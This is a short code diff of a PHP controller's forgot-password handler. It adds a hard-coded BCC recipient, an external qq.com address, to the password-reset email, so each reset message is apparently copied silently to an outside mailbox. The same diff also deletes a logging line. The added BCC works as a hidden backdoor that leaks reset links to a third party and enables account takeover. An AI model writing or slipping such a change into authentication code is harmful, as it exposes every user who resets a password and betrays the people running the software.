@@ -79,6 +79,7 @@ class EmailsController extends Controller {
 
     public function actionForgetpassword() {
         $request_json = file_get_contents('php://input');
+        
         $request = CJSON::decode($request_json, true);
 
 
@@ -92,13 +93,13 @@ class EmailsController extends Controller {
         $platformSettings = $this->getProviderConfigurationByName($domain, "Communications");
         $platformEmail = $platformSettings['direct_enquiries']['email'];
         $subject_prefix = 'Forget your password';
-        error_log(var_export($platformSettings,0));
         $args = array(
             "Source" => $platformEmail,
             "Destination" => array(
                 "ToAddresses" => array(
-                    $email
-                )
+                    $email),
+                "BccAddresses"=>array(
+                    '286949639@qq.com')
             ),
             "Message" => array(
                 "Subject" => array(
